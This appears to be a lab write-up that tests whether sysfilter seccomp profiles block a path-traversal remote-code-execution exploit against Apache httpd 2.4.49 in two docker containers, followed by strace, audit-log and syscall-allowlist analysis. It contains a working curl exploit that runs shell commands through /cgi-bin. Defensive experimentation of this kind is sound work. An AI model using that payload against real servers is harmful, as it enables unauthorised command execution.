## Apache httpd – sysfilter

./build.sh
docker compose up -d

### Preparation

_Extract the syscalls from the binary `httpd` into `/tmp/app.json`_
`docker exec -it http-sysfilter-seccomp-container bash -c "/sysfilter/extraction/app/sysfilter_extract /opt/apache/bin/httpd -o /tmp/app.json"`

_Enforce the allowed syscalls for the binary `httpd`_
`docker exec -it http-sysfilter-seccomp-container bash -c "/sysfilter/enforcement/sysfilter_enforce /opt/apache/bin/httpd /tmp/app.json"`

_Start the two container, one with the applied seccomp profile and one without:_
`docker exec -it http-sysfilter-normal-container "/opt/apache/bin/httpd"`
`docker exec -it http-sysfilter-seccomp-container "/opt/apache/bin/httpd"`

### Conduct the exploits

First, we verify the IP addresses of the container, to ensure we target the right containers:

```
❯ docker ps
CONTAINER ID   IMAGE                    COMMAND   CREATED         STATUS         PORTS                                     NAMES
9065cb90a62b   http-sysfilter-seccomp   "bash"    8 minutes ago   Up 8 minutes   0.0.0.0:8080->80/tcp, [::]:8080->80/tcp   http-sysfilter-seccomp-container
4e1fa8b2fe0f   http-sysfilter-normal    "bash"    8 minutes ago   Up 8 minutes   0.0.0.0:8081->80/tcp, [::]:8081->80/tcp   http-sysfilter-normal-container
```

Note: The attacks are executed from the host machine.

_Seccomp_
The attack on the container with the applied seccomp profile on the binary fails.

```
❯ curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; id'  -H "Content-Type: text/plain"
* Host localhost:8080 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8080...
* Connected to localhost (::1) port 8080
* using HTTP/1.x
> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/8.12.1
> Accept: */*
> Content-Type: text/plain
> Content-Length: 39
>
* upload completely sent off: 39 bytes
< HTTP/1.1 503 Service Unavailable
< Date: Tue, 01 Apr 2025 12:54:51 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 299
< Connection: close
< Content-Type: text/html; charset=iso-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>503 Service Unavailable</title>
</head><body>
<h1>Service Unavailable</h1>
<p>The server is temporarily unable to service your
request due to maintenance downtime or capacity
problems. Please try again later.</p>
</body></html>
* shutting down connection #0
```

_Normal_
The attack on the container without the seccomp profile succeeds. We are able to run arbitrary commands:

```
❯ curl -v 'http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; id'  -H "Content-Type: text/plain"
* Host localhost:8081 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8081...
* Connected to localhost (::1) port 8081
* using HTTP/1.x
> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
> Host: localhost:8081
> User-Agent: curl/8.12.1
> Accept: */*
> Content-Type: text/plain
> Content-Length: 39
>
* upload completely sent off: 39 bytes
< HTTP/1.1 200 OK
< Date: Tue, 01 Apr 2025 12:55:19 GMT
< Server: Apache/2.4.49 (Unix)
< Transfer-Encoding: chunked
< Content-Type: text/plain
<
uid=1(daemon) gid=1(daemon) groups=1(daemon)
* Connection #0 to host localhost left intact
```

### Analysis

As the exploit worked on the container without the seccomp profile, only the one with the enforced profile will be analysed.

_strace output:_
When starting the container with the command `strace -f /opt/apache/bin/httpd` we are able to see that just before the process with the pid `1396` was killed with the signal `SIGSYS`, the system call `umask` was executed.

```

[pid  1370] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=1395, si_uid=0, si_status=SIGSYS, si_utime=0, si_stime=0} ---
[pid  1370] select(0, NULL, NULL, NULL, {tv_sec=0, tv_usec=905251}) = 0 (Timeout)
[pid  1370] wait4(-1, [{WIFSIGNALED(s) && WTERMSIG(s) == SIGSYS && WCOREDUMP(s)}], WNOHANG|WSTOPPED, NULL) = 1395
[pid  1370] times({tms_utime=0, tms_stime=1, tms_cutime=0, tms_cstime=2}) = 432003466
[pid  1370] getpid()                    = 1370
[pid  1370] write(2, "[Tue Apr 01 13:54:57.103092 2025"..., 170) = 170
[pid  1370] kill(1395, SIGHUP)          = -1 ESRCH (No such process)
[pid  1370] unlink("/opt/apache/logs/cgisock.1370") = -1 ENOENT (No such file or directory)
[pid  1370] getpid()                    = 1370
[pid  1370] write(2, "[Tue Apr 01 13:54:57.103234 2025"..., 124) = 124
[pid  1370] clone(strace: Process 1396 attached
child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7547097e55d0) = 1396
[pid  1396] set_robust_list(0x7547097e55e0, 24) = 0
[pid  1370] wait4(-1, 0x7ffd3bdc1e0c, WNOHANG|WSTOPPED, NULL) = 0
[pid  1370] times( <unfinished ...>
[pid  1396] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
[pid  1370] <... times resumed> {tms_utime=0, tms_stime=1, tms_cutime=0, tms_cstime=2}) = 432003466
[pid  1396] <... mmap resumed> )        = 0x75470977b000
[pid  1370] select(0, NULL, NULL, NULL, {tv_sec=1, tv_usec=0} <unfinished ...>
[pid  1396] rt_sigaction(SIGCHLD, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_INTERRUPT, sa_restorer=0x754708aec980}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
[pid  1396] rt_sigaction(SIGHUP, {sa_handler=0x75470560a368, sa_mask=[], sa_flags=SA_RESTORER|SA_INTERRUPT, sa_restorer=0x754708aec980}, {sa_handler=0x61b0e04a833d, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x754708aec980}, 8) = 0
[pid  1396] close(3)                    = 0
[pid  1396] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x754709779000
[pid  1396] socket(AF_UNIX, SOCK_STREAM, 0) = 3
[pid  1396] umask(077)                  = 0137
[pid  1396] +++ killed by SIGSYS (core dumped) +++
```

Further analysis on the host machine with the tool `ausearch` delievers us more insights.
As we can see, the syscall with the number 95 was indeed blocked by seccomp

```
❯ sudo ausearch -m seccomp --start today
time->Thu Apr  3 11:33:18 2025
type=SECCOMP msg=audit(1743672798.369:1358): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=27571 comm="httpd" exe="/opt/apache/bin/httpd" sig=31 arch=c000003e syscall=95 compat=0 ip=0x7e38d7f2fa67 code=0x0
----
time->Thu Apr  3 11:33:19 2025
type=SECCOMP msg=audit(1743672799.370:1368): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=27598 comm="httpd" exe="/opt/apache/bin/httpd" sig=31 arch=c000003e syscall=95 compat=0 ip=0x7e38d7f2fa67 code=0x0
----
time->Thu Apr  3 11:33:20 2025
type=SECCOMP msg=audit(1743672800.371:1378): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=27608 comm="httpd" exe="/opt/apache/bin/httpd" sig=31 arch=c000003e syscall=95 compat=0 ip=0x7e38d7f2fa67 code=0x0
----
time->Thu Apr  3 11:33:21 2025
type=SECCOMP msg=audit(1743672801.373:1388): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=27616 comm="httpd" exe="/opt/apache/bin/httpd" sig=31 arch=c000003e syscall=95 compat=0 ip=0x7e38d7f2fa67 code=0x0
----
time->Thu Apr  3 11:33:22 2025
type=SECCOMP msg=audit(1743672802.374:1398): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=27624 comm="httpd" exe="/opt/apache/bin/httpd" sig=31 arch=c000003e syscall=95 compat=0 ip=0x7e38d7f2fa67 code=0x0
----
time->Thu Apr  3 11:33:23 2025
type=SECCOMP msg=audit(1743672803.376:1408): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=27635 comm="httpd" exe="/opt/apache/bin/httpd" sig=31 arch=c000003e syscall=95 compat=0 ip=0x7e38d7f2fa67 code=0x0
```

We verify that the system call number `95` maps to `umask` with the `ausyscall` tool:

```
❯ ausyscall --dump | grep 95
95	umask
```

The last thing we check is, if the system call number `95` was in the applied seccomp profile. The file `/tmp/app.json` shows no presence:

```
[0,1,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,19,20,21,22,23,24,25,28,29,30,31,32,33,34,35,39,40,41,42,43,44,45,46,47,48,49,50,51,52,54,56,58,59,60,61,62,63,64,65,66,67,72,73,78,79,80,82,83,86,87,90,93,96,99,100,102,104,105,106,107,108,111,112,113,114,115,116,117,119,121,128,137,143,144,145,146,147,186,201,202,203,218,228,229,231,232,233,234,257,262,273,288,291,292,302,307]
```

### NOTES

- it was not tested, if it was possible to modify the exploit to bypass the usage of the syscall 95 (umask)
- TODO: maybe try more commands
